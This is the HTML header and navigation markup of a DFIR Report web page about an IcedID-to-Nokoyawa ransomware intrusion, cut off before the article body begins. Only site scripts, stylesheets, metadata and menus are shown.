<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>IcedID Macro Ends in Nokoyawa Ransomware &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="737edf8f76aca4389e1e0626-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="737edf8f76aca4389e1e0626-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/18546" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=18546" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F05%2F22%2Ficedid-macro-ends-in-nokoyawa-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F05%2F22%2Ficedid-macro-ends-in-nokoyawa-ransomware%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="737edf8f76aca4389e1e0626-text/javascript"></script>
<script type="737edf8f76aca4389e1e0626-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="737edf8f76aca4389e1e0626-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=2671AC0DE327F3658988F6A62941800C');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="IcedID Macro Ends in Nokoyawa Ransomware" />
<meta property="og:url" content="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" />
<meta property="og:description" content="Threat actors have moved to other means of initial access, such as ISO files combined with LNKs or OneNote payloads, but some appearances of VBA macros in Office documents can still be seen in use.…" />
<meta property="article:published_time" content="2023-05-22T01:04:22+00:00" />
<meta property="article:modified_time" content="2024-06-26T11:34:54+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2023/05/18190-002.png" />
<meta property="og:image:width" content="1069" />
<meta property="og:image:height" content="1200" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="IcedID Macro Ends in Nokoyawa Ransomware" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2023/05/18190-002.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-18546 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
